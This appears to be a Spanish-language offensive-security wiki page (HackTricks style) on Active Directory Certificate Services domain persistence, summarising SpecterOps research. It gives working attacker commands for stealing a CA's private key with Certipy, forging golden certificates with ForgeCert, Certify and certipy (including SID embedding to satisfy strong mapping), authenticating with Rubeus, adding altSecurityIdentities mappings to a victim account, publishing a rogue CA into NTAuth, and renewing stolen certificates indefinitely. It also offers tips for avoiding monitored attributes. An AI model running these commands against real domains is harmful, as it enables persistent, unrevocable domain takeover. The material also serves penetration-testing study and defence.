# Persistencia de dominio de AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Este es un resumen de las técnicas de persistencia de dominio compartidas en [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consúltalo para obtener más detalles.<sup>[[5]](#references)</sup>

## Falsificación de certificados con certificados de CA robados (Golden Certificate) - DPERSIST1

¿Cómo puedes saber si un certificado es un certificado de CA?

Se puede determinar que un certificado es un certificado de CA si se cumplen varias condiciones:<sup>[[5]](#references)</sup>

- El certificado está almacenado en el servidor de CA, con su clave privada protegida por la DPAPI de la máquina o por hardware como un TPM/HSM si el sistema operativo lo admite.
- Los campos Issuer y Subject del certificado coinciden con el nombre distintivo de la CA.
- En los certificados de CA aparece exclusivamente una extensión "CA Version".
- El certificado no contiene campos Extended Key Usage (EKU).

Para extraer la clave privada de este certificado, la herramienta `certsrv.msc` en el servidor de CA es el método compatible mediante la GUI integrada. No obstante, este certificado no se diferencia de los demás almacenados en el sistema; por tanto, se pueden aplicar métodos como la [técnica THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) para extraerlo.

El certificado y la clave privada también se pueden obtener usando Certipy con el siguiente comando:<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Tras obtener el certificado de la CA y su clave privada en formato `.pfx`, pueden utilizarse herramientas como [ForgeCert](https://github.com/GhostPack/ForgeCert) para generar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> El usuario objetivo de la falsificación de certificados debe estar activo y poder autenticarse en Active Directory para que el proceso tenga éxito. Falsificar un certificado para cuentas especiales como krbtgt no es efectivo.

Este certificado falsificado será **válido** hasta la fecha de finalización especificada y **mientras el certificado de la CA raíz siga siendo válido** (normalmente entre 5 y **más de 10 años**). También es válido para **máquinas**, por lo que, combinado con **S4U2Self**, un atacante puede **mantener la persistencia en cualquier máquina del dominio** durante el tiempo que el certificado de la CA siga siendo válido.\
Además, los **certificados generados** con este método **no se pueden revocar**, ya que la CA no tiene conocimiento de ellos.

### Operando bajo Strong Certificate Mapping Enforcement (2025+)

Desde el 11 de febrero de 2025 (tras la implementación de KB5014754), los controladores de dominio utilizan de forma predeterminada **Full Enforcement** para las asignaciones de certificados. En la práctica, esto significa que los certificados falsificados deben:

- Contener un vínculo fuerte con la cuenta objetivo (por ejemplo, la extensión de seguridad SID), o
- Estar asociados a una asignación explícita y fuerte en el atributo `altSecurityIdentities` del objeto objetivo.<sup>[[1]](#references)</sup>

Un enfoque fiable para la persistencia consiste en acuñar un certificado falsificado encadenado a la Enterprise CA robada y, después, añadir una asignación explícita y fuerte al principal víctima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notas
- Si puedes crear certificados falsificados que incluyan la extensión de seguridad SID, estos se asignarán implícitamente incluso con Full Enforcement. De lo contrario, prioriza los strong mappings explícitos. Consulta [account-persistence](account-persistence.md) para obtener más información sobre los mappings explícitos.
- La revocación no ayuda a los defensores en este caso: los certificados falsificados son desconocidos para la base de datos de la CA y, por lo tanto, no se pueden revocar.

#### Forjado compatible con Full-Enforcement (con reconocimiento de SID)

Las herramientas actualizadas permiten insertar el SID directamente, manteniendo utilizables los golden certificates incluso cuando los DC rechazan los mappings débiles:<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Al incrustar el SID, evitas tener que modificar `altSecurityIdentities`, que puede estar monitorizado, y sigues cumpliendo las comprobaciones de strong mapping.

## Confiar en certificados de CA maliciosos - DPERSIST2

El objeto `NTAuthCertificates` está definido para contener uno o más **certificados de CA** en su atributo `cacertificate`, que Active Directory (AD) utiliza. El proceso de verificación por parte del **controlador de dominio** consiste en comprobar el objeto `NTAuthCertificates` en busca de una entrada que coincida con la **CA especificada** en el campo Issuer del **certificado** de autenticación. La autenticación continúa si se encuentra una coincidencia.<sup>[[5]](#references)</sup>

Un atacante puede añadir un certificado de CA autofirmado al objeto `NTAuthCertificates`, siempre que tenga control sobre este objeto de AD. Normalmente, solo los miembros del grupo **Enterprise Admin**, junto con **Domain Admins** o **Administrators** del **dominio raíz del forest**, tienen permisos para modificar este objeto. Pueden editar el objeto `NTAuthCertificates` utilizando `certutil.exe` con el comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, o mediante la [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionales útiles para esta técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Esta capacidad es especialmente relevante cuando se utiliza junto con un método descrito anteriormente que implica ForgeCert para generar certificados dinámicamente.

> Consideraciones de mapping posteriores a 2025: colocar una CA rogue en NTAuth solo establece confianza en la CA emisora. Para utilizar certificados leaf para el logon cuando los DC están en **Full Enforcement**, el leaf debe contener la extensión de seguridad SID o debe existir un mapping explícito y fuerte en el objeto de destino (por ejemplo, Issuer+Serial en `altSecurityIdentities`). Consulta {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Las oportunidades de **persistence** mediante modificaciones de **security descriptor** de los componentes de AD CS son numerosas. Las modificaciones descritas en la sección "[Domain Escalation](domain-escalation.md)" pueden ser implementadas maliciosamente por un atacante con acceso elevado. Esto incluye la adición de "control rights" (por ejemplo, WriteOwner/WriteDACL/etc.) a componentes sensibles como:<sup>[[5]](#references)</sup>

- El objeto **AD computer** del **CA server**
- El **RPC/DCOM server** del **CA server**
- Cualquier **AD object o container descendiente** en **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por ejemplo, el Certificate Templates container, Certification Authorities container, el objeto NTAuthCertificates, etc.)
- **AD groups** con derechos delegados para controlar AD CS de forma predeterminada o por la organización (como el grupo integrado Cert Publishers y cualquiera de sus miembros)

Un ejemplo de implementación maliciosa implicaría que un atacante con **elevated permissions** en el dominio añadiera el permiso **`WriteOwner`** a la plantilla de certificado predeterminada **`User`**, siendo el atacante el principal de ese derecho. Para explotarlo, el atacante cambiaría primero la propiedad de la plantilla **`User`** a sí mismo. Después, establecería **`mspki-certificate-name-flag`** en **1** en la plantilla para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, lo que permitiría a un usuario proporcionar un Subject Alternative Name en la solicitud. Posteriormente, el atacante podría hacer **enroll** utilizando la **template**, elegir el nombre de un **domain administrator** como nombre alternativo y utilizar el certificado obtenido para autenticarse como el DA.

Practical knobs que los atacantes pueden establecer para lograr persistence a largo plazo en el dominio (consulta {{#ref}}domain-escalation.md{{#endref}} para obtener todos los detalles y la detección):

- CA policy flags que permiten SAN por parte de los requesters (por ejemplo, habilitando `EDITF_ATTRIBUTESUBJECTALTNAME2`). Esto mantiene explotables las rutas similares a ESC1.
- DACL o settings de la template que permiten la emisión con capacidad de autenticación (por ejemplo, añadiendo Client Authentication EKU y habilitando `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar el objeto `NTAuthCertificates` o los CA containers para volver a introducir continuamente issuers rogue si los defenders intentan realizar cleanup.

> [!TIP]
> En entornos hardened después de KB5014754, combinar estas misconfigurations con strong mappings explícitos (`altSecurityIdentities`) garantiza que los certificados emitidos o forged sigan siendo utilizables incluso cuando los DC apliquen strong mapping.

### Certificate renewal abuse (ESC14) for persistence

Si comprometes un certificado con capacidad de autenticación (o uno de Enrollment Agent), puedes hacer **renew** de forma indefinida mientras la template emisora siga publicada y tu CA continúe confiando en la cadena del issuer. El renewal conserva los identity bindings originales, pero amplía la validez, lo que dificulta la eviction a menos que se corrija la template o se vuelva a publicar la CA.<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Si los controladores de dominio están en **Full Enforcement**, añade `-sid <victim SID>` (o utiliza una plantilla que aún incluya la extensión de seguridad SID) para que el certificado final renovado continúe asignándose mediante un mapeo fuerte sin modificar `altSecurityIdentities`. Los atacantes con derechos de administrador de la CA también pueden modificar `policy\RenewalValidityPeriodUnits` para alargar la duración de los certificados renovados antes de emitirse un certificado.<sup>[[2]](#references)[[4]](#references)</sup>


## Referencias

- [1] [Microsoft KB5014754 – Cambios en la autenticación basada en certificados en los controladores de dominio de Windows (cronograma de aplicación y mapeos fuertes)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Referencia de comandos y uso de forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (forge integrado con compatibilidad con SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Descripción general del abuso de renovación ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
